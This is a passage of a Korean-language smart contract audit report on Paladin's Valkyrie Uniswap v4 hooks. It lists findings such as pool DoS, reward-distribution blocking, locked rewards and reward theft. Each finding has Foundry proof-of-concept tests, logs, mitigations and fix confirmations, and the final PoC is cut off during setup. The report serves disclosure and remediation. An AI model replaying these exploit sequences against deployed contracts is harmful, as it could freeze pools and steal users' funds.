    uint256 liquidityTokenBalAlice = IncentivizedERC20(liquidityToken).balanceOf(alice);
    console.log("liquidityTokenBal alice: %s", liquidityTokenBalAlice);
    console.log("token0 diff alice add liquidity: %s", amount0AliceBefore - token0.balanceOf(alice));
    console.log("token1 diff alice add liquidity: %s", amount1AliceBefore - token1.balanceOf(alice));
}
```

출력:
```bash
Ran 1 test for test/FullRangeHook.t.sol:TestFullRangeHook
[PASS] test_addLiquidityFullRangePoC() (gas: 3292884)
Logs:
  bob adding liquidity
  added liquidity bob: 54353
  token0 diff bob add liquidity: 999994954645167564999855
  token1 diff bob add liquidity: 0
  liquidityTokenBal bob: 53353
  alice adding liquidity
  calculated liquidity: 54516555
  added liquidity alice: 54516555
  liquidityTokenBal alice: 66258319
  token0 diff alice add liquidity: 2439
  token1 diff alice add liquidity: 1219027186039
```
위에서 볼 수 있듯이, 앨리스는 훨씬 적은 기본 풀 토큰으로 훨씬 더 많은 유동성 토큰을 받습니다.

**Impact:** `FullRangeHook`로 구성된 풀은 가격을 의도된 범위 밖으로 조작하여 비활성화될 수 있습니다. 또한 유동성 공급자에게 금전적 손실을 초래할 수 있습니다.

**Recommended Mitigation:** `FullRangeHook`으로 스왑할 때 가격이 의도된 틱 범위를 벗어나지 않도록 하세요:

```diff
    function afterSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata, BalanceDelta, bytes calldata)
        external
        override
        onlyPoolManager
        returns (bytes4, int128)
    {
        PoolId poolId = key.toId();

++      (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolId);
++      require(sqrtPriceX96 > TickMath.getSqrtPriceAtTick(MIN_TICK) && sqrtPriceX96 < TickMath.getSqrtPriceAtTick(MAX_TICK), "Outside tick range");

        if (address(incentiveManager) != address(0)) {
            incentiveManager.notifySwap(poolId, poolInfo[poolId].liquidityToken);
        }

        return (FullRangeHook.afterSwap.selector, 0);
    }
```

이러한 방식으로 가격 변동을 제한하는 것은 `FullRangeHook`에 대해서는 잘 작동하지만, `MultiRangeHook`의 경우 완화가 더 어렵습니다. `MultiRangeHook`의 경우 가격이 다양한 가격 범위 안팎으로 이동할 수 있는 것이 의도된 동작이기 때문입니다. 기존의 슬리피지 검증은 전송자가 올바르게 구성하는 한 충분한 보호를 제공해야 합니다. 제곱근 가격이 틱 제한 중 하나를 교차하도록 하는 유동성 추가의 악의적인 프론트 러닝은 단면적(single-sided) 유동성이 제공되는 결과를 초래할 것이기 때문입니다. 따라서 두 토큰 모두에서 유동성을 제공하려는 기대는 유지되지 않으며 0이 아닌 최소 금액 매개변수는 검증을 통과하지 못할 것입니다.

**Paladin:** 커밋 [`abbb673`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/abbb673014b77f46119eb24a62f4d0fef2c9ff1d)으로 수정되었습니다.

**Cyfrin:** 검증되었습니다. `FullRangeHook::afterSwap`은 이제 제곱근 가격이 의도된 틱 범위를 벗어나는 것을 방지합니다.


### Reward distribution can be blocked by an initial distribution of long duration

**Description:** 보상 분배는 무허가이므로 누구나 1주보다 큰 기간으로 임의의 양의 토큰을 분배할 수 있습니다. 주어진 토큰에 대해 기존 분배가 활성화되어 있고 추가 토큰이 분배되려고 하면 기간이 종료 날짜에 추가됩니다. 그러나 초기 기간이 이미 `type(uint32).max` 오버플로우에 가깝게 설정된 경우 이 로직은 완전한 DoS를 초래할 수 있습니다.

```solidity
function depositRewards(IncentivizedPoolId id, address token, uint256 amount, uint256 duration)
    external
    override
    nonReentrant
{
    ...
    // Update the reward distribution parameters
    uint32 endTimestampCache = _state.endTimestamp;
    if (endTimestampCache < block.timestamp) {
        ...
    } else {
        // Calculates the remianing duration left for the current distribution
        uint256 remainingDuration = endTimestampCache - block.timestamp;
        if (remainingDuration + duration < MIN_DURATION) revert InvalidDuration();
        // And calculates the new duration
        uint256 newDuration = remainingDuration + duration;

        // Calculates the leftover rewards from the current distribution
        uint96 ratePerSecCache = _state.ratePerSec;
        uint256 leftoverRewards = ratePerSecCache * remainingDuration;

        // Calculates the new rate
        uint256 newRate = (amount + leftoverRewards) / newDuration;
        if (newRate < ratePerSecCache) revert CannotReduceRate();

        // Stores the new reward distribution parameters
        _state.ratePerSec = newRate.toUint96();
        _state.endTimestamp = (block.timestamp + newDuration).toUint32();
        _state.lastUpdateTime = (block.timestamp).toUint32();
    }
    ...
}
```

**Impact:** 공격자는 토큰의 1 wei를 예치하고 첫 번째 분배자가 됨으로써 모든 토큰의 분배를 자유롭게 DoS 할 수 있습니다.

**Proof of Concept:** 다음 테스트는 `BasicIncentiveLogic.t.sol`에 배치되어야 합니다:
```solidity
    function test_DoSTokenIncentiveDistribution() public {
        PoolId poolKey;
        IncentivizedPoolId poolId;
        address lpToken = address(7);

        poolKey = createPoolKey(address(1), address(2), 3000).toId();
        poolId = IncentivizedPoolKey({ id: poolKey, lpToken: lpToken }).toId();

        manager.setListedPool(poolId, true);

        address[] memory systems = new address[](1);
        systems[0] = address(logic);

        manager.notifyAddLiquidty(systems, poolKey, lpToken, user1, int256(100 * 10 ** 18));

        uint256 amount = 1;
        uint256 duration = type(uint32).max - 1 - block.timestamp;

        logic.depositRewards(poolId, address(token0), amount, duration);

        skip(3 days);

        // If someone tries to deposit more tokens, the duration will overflow
        vm.expectRevert();
        logic.depositRewards(poolId, address(token0), 100 * 10 ** 18, 1 weeks);
    }
```

**Recommended Mitigation:** 기간을 최대 길이로 제한하는 것을 고려하세요.

**Paladin:** 커밋 [`c3298fa`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/c3298fa520787ca07034d055ac9c3f71aefebb67)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 최대 인센티브 분배 기간이 구현되었습니다.


### Swaps performed in pools with zero liquidity can cause a complete DoS of `FullRangeHook`

**Description:** `FullRangeHook`은 풀에서 스왑이 실행될 때마다 재조정(rebalancing)하는 특징이 있습니다:

```solidity
function _rebalance(PoolKey memory key) public {
    PoolId poolId = key.toId();
    // Remove all the liquidity from the Pool
    (BalanceDelta balanceDelta,) = poolManager.modifyLiquidity(
        key,
        IPoolManager.ModifyLiquidityParams({
            tickLower: MIN_TICK,
            tickUpper: MAX_TICK,
            liquidityDelta: -(poolManager.getLiquidity(poolId).toInt256()),
            salt: 0
        }),
        ZERO_BYTES
    );
    ...
}
```

나중에 가격 조정을 위해 풀에 예치된 모든 유동성을 먼저 제거합니다; 그러나 이는 제거할 유동성이 포지션에 이미 있다고 가정합니다. 따라서 유동성이 없으면 `Pool::modifyLiquidity` 내에서 호출되는 다음 Uniswap 구현으로 인해 revert 됩니다:

```solidity
library Position {
    ...
    function update(
        State storage self,
        int128 liquidityDelta,
        uint256 feeGrowthInside0X128,
        uint256 feeGrowthInside1X128
    ) internal returns (uint256 feesOwed0, uint256 feesOwed1) {
        uint128 liquidity = self.liquidity;

        if (liquidityDelta == 0) {
            // disallow pokes for 0 liquidity positions
@>          if (liquidity == 0) CannotUpdateEmptyPosition.selector.revertWith();
        } else {
            self.liquidity = LiquidityMath.addDelta(liquidity, liquidityDelta);
        }
        ...
    }
}
```

따라서 누구든지 초기화 직후 단일 스왑을 실행하여 풀을 DoS 할 수 있습니다. 왜냐하면 이렇게 하면 `hasAccruedFees` 상태가 true로 설정되기 때문입니다. 그 후 첫 번째 유동성 추가는 포지션에 0의 유동성을 가진 상태에서 `_rebalance()` 함수를 실행하여 revert를 초래합니다.

```solidity
function _unlockCallback(bytes calldata rawData) internal override returns (bytes memory) {
    ...
    // Rebalance the Pool if the Pool had swaps to adapt to new price
    if (pool.hasAccruedFees) {
        pool.hasAccruedFees = false;
        _rebalance(data.key);
    }
   ...
}
```

**Impact:** 누구나 `FullRangeHook`으로 초기화된 풀에 대해 초기화 직후 스왑을 실행하기만 하면 간단히 DoS 할 수 있습니다.

**Proof of Concept:** 이 테스트를 실행하려면 `HookEnabledSwapRouter`의 다음 코드 라인을 주석 처리해야 합니다:
```
function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
    ...

    // Make sure youve added liquidity to the test pool!
    // @audit disabled this for testing purposes
    // if (BalanceDelta.unwrap(delta) == 0) revert NoSwapOccurred();

    ...
}
```
다음 테스트는 `FullRangeHook.t.sol`에 배치되어야 합니다:

```solidity
function test_FullRangeDoSDueToSwapWithNoLiquidity(uint256 token0Amount, uint256 token1Amount) public {
    // Constraining a minimum of 10000 to compute a liquidity above the 1000 minimum
    token0Amount = bound(token0Amount, 10000, key.currency0.balanceOfSelf());
    token1Amount = bound(token1Amount, 10000, key.currency1.balanceOfSelf());

    manager.initialize(key, SQRT_PRICE_1_1);

    IPoolManager.SwapParams memory params;
    HookEnabledSwapRouter.TestSettings memory settings;

    params =
        IPoolManager.SwapParams({ zeroForOne: true, amountSpecified: int256(- 1), sqrtPriceLimitX96: 79228162514264337593543950330 });
    settings =
        HookEnabledSwapRouter.TestSettings({ takeClaims: false, settleUsingBurn: false });

    router.swap(key, params, settings, ZERO_BYTES);

    (bool hasAccruedFees,) = fullRange.poolInfo(id);
    assertEq(hasAccruedFees, true);

    vm.expectRevert();
    fullRange.addLiquidity(
        FullRangeHook.AddLiquidityParams(
            key.currency0, key.currency1, 3000, token0Amount, token1Amount, 0, 0, address(this), MAX_DEADLINE
        )
    );
}
```

여기서는 1 wei가 스왑되었지만 실제로는 어떤 금액이든 풀을 DoS 하는 데 사용할 수 있습니다.

테스트를 성공적으로 실행하려면 `HookEnabledSwapRouter`의 다음 코드 줄을 주석 처리해야 합니다:

```solidity
function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
    ...
    // Make sure youve added liquidity to the test pool!
    // @audit disabled this for testing purposes
    // if (BalanceDelta.unwrap(delta) == 0) revert NoSwapOccurred();
    ...
}
```

이것은 테스트에서 스왑을 실행하기 위한 헬퍼 함수일 뿐이지만 0 델타 스왑을 방지합니다.

**Recommended Mitigation:** 제곱근 가격이 임의로 이동하는 것을 방지하기 위해 유동성이 없을 때 풀에서 스왑이 이루어지는 것을 방지하세요:

```diff
    function beforeSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata, bytes calldata)
        external
        override
        onlyPoolManager
        returns (bytes4, BeforeSwapDelta, uint24)
    {
--      PoolInfo storage pool = poolInfo[key.toId()];
++      PoolId poolId = key.toId();
++      PoolInfo storage pool = poolInfo[poolId];
++      require(poolManager.getLiquidity(poolId) > 0);

        if (!pool.hasAccruedFees) {
            pool.hasAccruedFees = true;
        }

        return (FullRangeHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }
```

대안으로, 풀을 초기화할 때 원자적으로(atomically) 최소 유동성을 추가하는 것을 고려하세요.

**Paladin:** 커밋 [`46fa611`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/46fa6111e3aee74913a05f2de72120fc70d4f032)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. `FullRangeHook::beforeSwap`은 이제 제로 유동성에 대해 스왑이 수행되는 것을 방지합니다.


### Swaps are not possible on pools registered with Bunni due to incorrect access control in `ValkyrieHooklet::afterSwap`

**Description:** `ValkyrieHooklet::afterSwap`에는 `onlyBunniHub` 제어자가 적용되어 있습니다; 그러나 이 훅은 `BunniHub`(`BunniHubLogic` 라이브러리 사용)가 아닌 `BunniHook`(`BunniHookLogic` 라이브러리 사용)에서 호출됩니다. 따라서 이는 Bunni에 등록되고 `ValkyrieHooklet`으로 구성된 풀에 대한 스왑 기능의 DoS를 초래할 것입니다.

```solidity
function afterSwap(
    address,
    PoolKey calldata key,
    IPoolManager.SwapParams calldata,
    SwapReturnData calldata
) external override onlyBunniHub returns (bytes4 selector) {
    PoolId poolId = key.toId();
    if (address(incentiveManager) != address(0)) {
        incentiveManager.notifySwap(poolId, bunniTokens[poolId]);
    }
    return ValkyrieHooklet.afterSwap.selector;
}
```

이와 관련하여, `ValkyrieHooklet::beforeSwap`은 no-op 훅인 동안 접근 제어가 누락된 유일한 비-뷰(non-view) 함수이므로 `ValkyrieHooklet::afterSwap`에 적용된 올바른 접근 제어를 반영해야 합니다.

**Impact:** 인센티브 로직은 직접적인 영향을 받지 않지만, Bunni에 등록되고 `ValkyrieHooklet`으로 구성된 풀에 대해서는 스왑이 불가능하므로 쓸모가 없게 됩니다.

**Proof of Concept:** 현재 `MockBunniHub`에는 다음 함수가 포함되어 있습니다:

```solidity
function afterDeposit(
    address hooklet,
    address caller,
    IBunniHub.DepositParams calldata params,
    IHooklet.DepositReturnData calldata returnData
) external {
    ValkyrieHooklet(hooklet).afterDeposit(
        caller,
        params,
        returnData
    );
}
```

따라서 `ValkyrieHooklet.t.sol`의 `test_afterSwap()`은 revert 되지 않습니다. 그러나 이 문제는 실제 Bunni v2 코드베이스를 사용하도록 테스트 스위트가 업데이트될 때 테스트 실패로 명백해질 것입니다.

**Recommended Mitigation:** `ValkyrieHooklet::afterSwap`과 `ValkyrieHooklet::beforeSwap` 모두에 올바른 `onlyBunniHook` 제어자를 적용하세요.

**Paladin:** 커밋 [`333f26b`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/333f26bcdad465cae4f7fbdeee8ebfca2ce43659)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. `ValkyrieHooklet::afterSwap`은 이제 새로 추가된 `onlyHook` 제어자를 사용하여 올바른 호출자를 확인합니다. `bunniHook` NatSpec이 `bunniHub`에서 잘못 복사되었다는 점에 유의하세요.

**Paladin:** 최신 버전의 브랜치에서 Natspec은 `/// @dev Modifier to check that the caller is the BunniHook`입니다.

**Cyfrin:** 인정함(Acknowledged).


### Missing user liquidity sync in `TimeWeightedIncentiveLogic::_updateAllUserState` can result in rewards becoming locked

**Description:** 인센티브 로직 컨트랙트 내에서 유동성 동기화는 스토리지의 유동성 값을 기반으로 계산을 수행하기 전에 반드시 수행해야 하는 단계입니다. `TimeWeightedIncentiveLogic` 내의 총 유동성의 경우 보상을 예치할 때 자동 동기화가 수행됩니다:

```solidity
function _depositRewards(
    IncentivizedPoolId id,
    address token,
    uint256 amount,
    uint256 duration,
    uint256 requiredDuration,
    RewardType rewardType
) internal {
    ...
    // Sync pool total liquidity if not already done
    if(!poolSynced[id]) {
        _syncPoolLiquidity(id);
        poolSynced[id] = true;
    }

    emit RewardsDeposited(id, token, amount, duration);
}
```

대조적으로, 사용자 유동성 동기화는 현재 `TimeWeightedIncentiveLogic`의 어느 곳에서도 수행되지 않습니다. 기본 `BaseIncentiveLogic::syncUser` 메서드는 호출자가 수동으로 동기화를 실행할 수 있도록 노출되어 있습니다; 그러나 다른 로직 컨트랙트에서는 `BaseIncentiveLogic::_updateAllUserState`를 실행할 때 이 사용자 유동성 동기화가 수행됩니다. `TimeWeightedIncentiveLogic`이 내부 호출을 포함하지 않고 이 메서드를 오버라이드하기 때문에 사용자 유동성 동기화가 누락되었습니다:

```solidity
function _updateAllUserState(IncentivizedPoolId id, address account) internal override {
    address[] memory _tokens = poolRewards[id];
    uint256 _length = _tokens.length;
    for (uint256 i; i < _length; i++) {
        _updateRewardState(id, _tokens[i], account);
    }
    _updateCheckpoints(id, account);
}
```

사용자가 보상을 청구하기 전에 유동성을 수동으로 동기화하지 않으면 자금 손실로 이어질 수 있습니다.

**Impact:** 사용자가 컨트랙트에 갇히게 될 자금을 잃을 가능성이 있습니다. 이는 사용자 유동성을 수동으로 동기화하여 방지할 수 있습니다; 그러나 다른 인센티브 로직 컨트랙트가 이를 자동으로 수행하므로 사용자가 `TimeWeightedIncentiveLogic`에도 동일하게 적용될 것이라고 기대하는 것은 합리적입니다.

**Proof of Concept:** 다음 테스트는 사용자가 청구하기 전에 유동성을 수동으로 동기화하지 않을 때 받을 자격이 있는 보상의 절반만 받는 것을 보여줍니다:

```solidity
function test_MissingUserSync() public {
    skip(1 weeks);

    logic.updateDefaultFee(0);

    address[] memory emptySystems = new address[](0);
    IncentivizedPoolId incentivizedId = manager.getIncentivizedKey(pool1, lpToken1);

    manager.setListedPool(incentivizedId, true);

    // Register 100 tokens for the user1 for an empty logic
    // Manager.TotalLiquidity = 100
    // Manager.User1Liquidity = 100
    manager.notifyAddLiquidty(emptySystems, pool1, lpToken1, user1, int256(100 ether));

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    // 1000 tokens will be distributed during 1 week
    uint256 amount = 1000 ether;
    uint256 duration = 1 weeks;

    // Distributing rewards triggers total liquidity sync
    // Manager.TotalLiquidity = 200
    // Manager.User1Liquidity = 200
    // Logic.TotalLiquidity = 200
    // Logic.User1Liquidity = 0
    logic.depositRewards(incentivizedId, address(token0), amount, duration);

    // Register now 100 more tokens for the user1 once the new logic is already registered
    // Manager.TotalLiquidity = 200
    // Manager.User1Liquidity = 200
    // Logic.TotalLiquidity = 200
    // Logic.User1Liquidity = 100
    manager.notifyAddLiquidty(systems, pool1, lpToken1, user1, int256(100 ether));

    // Skip a lot of time to avoid the time weighted feature
    skip(10000000 weeks);

    uint256 tokensEarned = logic.claim(incentivizedId, address(token0), user1, user1);

    console.log(tokensEarned);
}
```

Output:
```bash
[PASS] test_MissingUserSync() (gas: 525165)
Logs:
  499999974999958531200
```

사용자가 청구하기 전에 유동성을 수동으로 동기화하면 전체 권리 금액을 받습니다:
```solidity
function test_MissingUserSync() public {
    skip(1 weeks);

    logic.updateDefaultFee(0);

    address[] memory emptySystems = new address[](0);
    IncentivizedPoolId incentivizedId = manager.getIncentivizedKey(pool1, lpToken1);

    manager.setListedPool(incentivizedId, true);

    // Register 100 tokens for the user1 for an empty logic
    // Manager.TotalLiquidity = 100
    // Manager.User1Liquidity = 100
    manager.notifyAddLiquidty(emptySystems, pool1, lpToken1, user1, int256(100 ether));

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    // 1000 tokens will be distributed during 1 week
    uint256 amount = 1000 ether;
    uint256 duration = 1 weeks;

    // Distributing rewards triggers total liquidity sync
    // Manager.TotalLiquidity = 200
    // Manager.User1Liquidity = 200
    // Logic.TotalLiquidity = 200
    // Logic.User1Liquidity = 0
    logic.depositRewards(incentivizedId, address(token0), amount, duration);

    // Register now 100 more tokens for the user1 once the new logic is already registered
    // Manager.TotalLiquidity = 200
    // Manager.User1Liquidity = 200
    // Logic.TotalLiquidity = 200
    // Logic.User1Liquidity = 100
    manager.notifyAddLiquidty(systems, pool1, lpToken1, user1, int256(100 ether));

    // Skip a lot of time to avoid the time weighted feature
    skip(10000000 weeks);

    // Sync user's liquidity
    // Manager.TotalLiquidity = 200
    // Manager.User1Liquidity = 200
    // Logic.TotalLiquidity = 200
    // Logic.User1Liquidity = 200
    logic.syncUser(incentivizedId, user1);

    uint256 tokensEarned = logic.claim(incentivizedId, address(token0), user1, user1);

    console.log(tokensEarned);
}
```

Output:
```bash
[PASS] test_MissingUserSync() (gas: 527587)
Logs:
  999999949999917062400
```

청구되지 않은 자금은 컨트랙트에 갇히게 되며 사용자는 후속 동기화를 통해서도 이를 청구할 수 없다는 점에 유의하세요:

```solidity
function test_MissingUserSync() public {
    skip(1 weeks);

    logic.updateDefaultFee(0);

    address[] memory emptySystems = new address[](0);
    IncentivizedPoolId incentivizedId = manager.getIncentivizedKey(pool1, lpToken1);

    manager.setListedPool(incentivizedId, true);

    // Register 100 tokens for the user1 for an empty logic
    // Manager.TotalLiquidity = 100
    // Manager.User1Liquidity = 100
    manager.notifyAddLiquidty(emptySystems, pool1, lpToken1, user1, int256(100 ether));

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    // 1000 tokens will be distributed during 1 week
    uint256 amount = 1000 ether;
    uint256 duration = 1 weeks;

    // Distributing rewards triggers total liquidity sync
    // Manager.TotalLiquidity = 200
    // Manager.User1Liquidity = 200
    // Logic.TotalLiquidity = 200
    // Logic.User1Liquidity = 0
    logic.depositRewards(incentivizedId, address(token0), amount, duration);

    // Register now 100 more tokens for the user1 once the new logic is already registered
    // Manager.TotalLiquidity = 200
    // Manager.User1Liquidity = 200
    // Logic.TotalLiquidity = 200
    // Logic.User1Liquidity = 100
    manager.notifyAddLiquidty(systems, pool1, lpToken1, user1, int256(100 ether));

    // Skip a lot of time to avoid the time weighted feature
    skip(10000000 weeks);

    uint256 tokensEarned1 = logic.claim(incentivizedId, address(token0), user1, user1);
    logic.syncUser(incentivizedId, user1);
    uint256 tokensEarned2 = logic.claim(incentivizedId, address(token0), user1, user1);

    console.log(tokensEarned1);
    console.log(tokensEarned2);
}
```
Output:
```
[PASS] test_MissingUserSync() (gas: 534424)
Logs:
499999974999958531200
0
```

**Recommended Mitigation:** `_updateAllUserState` 함수에서 자동 사용자 유동성 동기화를 실행하세요:
```diff

function _updateAllUserState(IncentivizedPoolId id, address account) internal override {
++      if(!userLiquiditySynced[id][account]) {
++          _syncUserLiquidity(id, account);
++          userLiquiditySynced[id][account] = true;
++      }

    address[] memory _tokens = poolRewards[id];
    uint256 _length = _tokens.length;
    for (uint256 i; i < _length; i++) {
        _updateRewardState(id, _tokens[i], account);
    }
    _updateCheckpoints(id, account);
}
```

**Paladin:** 커밋 [`10383a1`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/10383a15bdd21f8ad61676fc3ec4959fcda01574)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 누락된 동기화가 `TimeWeightedIncentiveLogic::_updateAllUserState`에 추가되었습니다.


### Denial of service for swaps on `MultiRangeHook` pools

**Description:** `MultiRangeHook`에서 새로운 범위가 생성되면, 새로운 `IncentivizedERC20` LP 토큰이 등록되고 특정 풀에 해당하는 토큰 배열에 추가됩니다:

```solidity
    function createRange(PoolKey calldata key, RangeKey calldata rangeKey) external {
        ...
        address lpToken = address(new IncentivizedERC20(tokenSymbol, tokenSymbol, poolId));

        // Store the Range and LP token infos
        rangeLpToken[rangeId] = lpToken;
        validLpToken[lpToken] = true;
@>      poolLpTokens[poolId].push(lpToken);
        ...
    }
```

이 작업은 무허가이므로 누구나 무제한의 범위를 생성하여 `poolLpTokens` 배열이 무제한으로 커지게 할 수 있습니다. 그런 다음 진정한 사용자가 풀을 활용하여 스왑을 시도하면 `afterSwap()` 훅 함수가 트리거됩니다:

```solidity
function afterSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata, BalanceDelta, bytes calldata)
    external
    override
    onlyPoolManager
    returns (bytes4, int128)
{
    PoolId poolId = key.toId();

    if (address(incentiveManager) != address(0)) {
        incentiveManager.notifySwap(poolId, poolLpTokens[poolId]);
    }

    return (MultiRangeHook.afterSwap.selector, 0);
}
```

이 함수는 인센티브 관리자에게 풀 ID와 생성된 모든 범위에 해당하는 LP 토큰 주소 배열을 전달하여 알립니다. 따라서 이 알림은 모든 주소를 루핑하여 스왑의 각 등록된 로직에 알립니다:

```solidity
function notifySwap(PoolId id, address[] calldata lpTokens) external onlyAllowedHooks {
    // @gas cheaper not to cache length for calldata array input
    for (uint256 i; i < lpTokens.length;) {
        _notifySwap(id, lpTokens[i]);
        unchecked {
            ++i;
        }
    }
}

function _notifySwap(PoolId id, address lpToken) internal {
    // Convert PoolId to IncentivizedPoolId
    IncentivizedPoolId _id = IncentivizedPoolKey({ id: id, lpToken: lpToken }).toId();
    if (poolLinkedHook[_id] != msg.sender) revert NotLinkedHook();
    // Get the list of Incentive Systems linked to the pool
    uint256[] memory _systems = _getPoolIncentiveSystemIndexes(_id);

    uint256 length = _systems.length;
    if (length > 0) {
        for (uint256 i; i < length;) {
            // @gas cheaper to read them both at same time using this style
            IncentiveSystem storage sRef = incentiveSystems[_systems[i]];
            (address system, bool updateOnSwap) = (sRef.system, sRef.updateOnSwap);
            if (updateOnSwap) {
                // Notify the Incentive Logic of the swap
                IIncentiveLogic(system).notifySwap(_id);
            }
            unchecked {
                ++i;
            }
        }
    }
}
```

이 배열이 너무 크면 가스 부족(out-of-gas) 오류로 인해 이 함수의 실행이 실패하여 풀에서 스왑이 발생하는 것을 방지합니다.

**Impact:** 악의적인 사용자는 `MultiRangeHook`으로 구성된 풀에서 스왑이 수행되는 것을 방지할 수 있습니다.

**Recommended Mitigation:** 범위 생성을 허가된 작업으로 만들고 배열이 무제한으로 커지는 것을 방지하기 위해 생성할 수 있는 최대 양을 제한하는 것을 고려하세요.

**Paladin:** 커밋 [`7af7783`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/7af7783b2236598193ef0b4fa66032b91e3e4e40)으로 수정되었습니다. 악의적인 행위자가 풀에 대해 가능한 모든 범위를 생성하여 다른 사용자가 범위를 생성하는 것을 차단하는 경우가 있다는 것을 알고 범위 생성 메서드를 허가된 상태로 만들지 않기로 결정했습니다. 이러한 경우 더 많은 제어 기능이 있는 `MultiRangeHook.sol`의 다른 버전이나 범위를 생성할 수 있는 허용 목록을 배포하여 `IncentiveManager`에 연결할 수 있습니다.

**Cyfrin:** 검증되었습니다. 풀당 최대 5개의 범위가 시행되었습니다.


### Rewards can be stolen when `IncentivizedERC20` tokens are recursively provided as liquidity

**Description:** DeFi의 구성 가능한(composable) 특성으로 인해 Valkyrie와 유사한 방식으로 특정 형태의 수익률이나 기타 토큰화된 인센티브를 캡슐화하는 래핑된(wrapped) 유동성 토큰을 갖는 것이 일반적입니다. LRT 및 Bunni에 의해 활성화된 것과 같은 다른 형태의 재담보(re-hypothecation)의 보편화로 인해, 이러한 인센티브화된 유동성은 다른 토큰과 쌍을 이룰 때 종종 재귀적으로 유동성으로 제공됩니다.

이 경우, 다른 풀에 제공된 인센티브화된 유동성 토큰은 원래 예치자가 아니더라도 모든 주소에 의해 보상이 고갈될 수 있습니다. 다른 풀에 유동성으로 추가되면 `PoolManager`는 델타를 정산할 때 호출자로부터 자금을 가져옵니다:

```solidity
function settle(Currency currency, IPoolManager manager, address payer, uint256 amount, bool burn) internal {
    ...
    } else {
        manager.sync(currency);
        if (payer != address(this)) {
            IERC20Minimal(Currency.unwrap(currency)).transferFrom(payer, address(manager), amount);
        } else {
            IERC20Minimal(Currency.unwrap(currency)).transfer(address(manager), amount);
        }
        manager.settle();
    }
}
```

이는 결과적으로 `notifyTransfer()` 훅이 호출되도록 합니다:

```solidity
function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
    ITokenizedHook(hook).notifyTransfer(poolId, from, to, amount);

    return super.transferFrom(from, to, amount);
}
```

이는 발신자를 차감하고 `PoolManager`를 입금합니다:

```solidity
poolUserLiquidity[_id][from] -= amount;
poolUserLiquidity[_id][to] += amount;
```

그 후 공격은 Uniswap v4 `PoolManager`를 대신하여 인센티브를 청구함으로써 수행됩니다. 이는 보상 토큰에 대한 양의 델타를 생성하며, 이는 잠금 해제 콜백 실행이 끝나기 전에 임시 준비금을 0으로 되돌리고 델타를 정산하는 데 사용될 수 있습니다.

**Impact:** `IncentivizedERC20` 토큰이 재귀적으로 유동성으로 제공될 때 보상을 도난당할 수 있습니다.

**Proof of Concept:** 다음 내용으로 `E2E.t.sol`이라는 새 파일을 생성해야 합니다:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import { Test } from "forge-std/Test.sol";
import { BasicIncentiveLogic } from "../src/incentives/BasicIncentiveLogic.sol";
import { Deployers } from "@uniswap/v4-core/test/utils/Deployers.sol";
import { MockERC20 } from "solmate/src/test/utils/mocks/MockERC20.sol";
import { CurrencyLibrary, Currency } from "@uniswap/v4-core/src/types/Currency.sol";
import { CurrencySettler } from "@uniswap/v4-core/test/utils/CurrencySettler.sol";
import { PoolId, PoolIdLibrary } from "@uniswap/v4-core/src/types/PoolId.sol";
import {
    IncentivizedPoolId, IncentivizedPoolKey, IncentivizedPoolIdLibrary
} from "../src/types/IncentivizedPoolKey.sol";
import { IncentivizedERC20 } from "../src/libraries/IncentivizedERC20.sol";
import { IPoolManager } from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import { PoolKey } from "@uniswap/v4-core/src/types/PoolKey.sol";
import { Hooks } from "@uniswap/v4-core/src/libraries/Hooks.sol";
import { IHooks } from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import { FullRangeHook } from "../src/hooks/FullRangeHook.sol";
import { FullRangeHookImpl } from "./implementations/FullRangeHookImpl.sol";
import { IIncentiveManager } from "../src/interfaces/IIncentiveManager.sol";
import { IncentiveManager } from "../src/incentives/IncentiveManager.sol";
import { TickMath } from "@uniswap/v4-core/src/libraries/TickMath.sol";
import { LiquidityAmounts } from "../src/libraries/LiquidityAmounts.sol";
import { StateLibrary } from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";

import "forge-std/console.sol";

contract E2E is Test, Deployers {
    using PoolIdLibrary for PoolKey;
    using IncentivizedPoolIdLibrary for IncentivizedPoolKey;
    using CurrencyLibrary for Currency;
    using CurrencySettler for Currency;
    using StateLibrary for IPoolManager;
    using TransientStateLibrary for IPoolManager;

    uint256 constant MAX_DEADLINE = 12329839823;
    /// @dev Min tick for full range with tick spacing of 60
    int24 internal constant MIN_TICK = -887220;
    /// @dev Max tick for full range with tick spacing of 60
    int24 internal constant MAX_TICK = -MIN_TICK;
    int24 constant TICK_SPACING = 60;
    uint16 constant LOCKED_LIQUIDITY = 1000;
    uint256 constant BASE_FEE = 500;
    uint256 constant FEE_DELTA = 0.1 ether;

    event NewIncentiveLogic(uint256 indexed index, address indexed logic);
    event Deposited(address indexed account, PoolId indexed poolId, uint256 liquidity);

    FullRangeHookImpl fullRange = FullRangeHookImpl(
        address(
            uint160(
                Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_ADD_LIQUIDITY_FLAG | Hooks.BEFORE_SWAP_FLAG
                    | Hooks.AFTER_SWAP_FLAG
            )
        )
    );
    address hookAddress;

    IncentiveManager incentiveManager;

    MockERC20 token0;
    MockERC20 token1;

    PoolId id;

    BasicIncentiveLogic logic;

    address alice;
    address bob;

    struct CallbackData {
        IncentivizedPoolId id;
        Currency currency;
